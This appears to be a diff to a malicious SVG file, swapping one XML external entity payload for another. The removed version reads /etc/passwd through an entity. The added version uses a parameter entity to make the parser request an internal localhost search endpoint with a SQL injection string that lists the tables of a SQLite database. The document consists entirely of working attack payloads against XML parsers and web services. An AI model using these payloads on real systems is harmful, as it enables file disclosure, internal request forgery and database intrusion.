@@ -1,6 +1,5 @@
 <!DOCTYPE svg [
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!ENTITY % xxe SYSTEM "http://localhost:8001/search?q=' UNION SELECT tbl_name,1 FROM sqlite_master WHERE type='table'--">
+%xxe;
 ]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <text>&xxe;</text>
-</svg>
+<svg xmlns="http://www.w3.org/2000/svg"/>
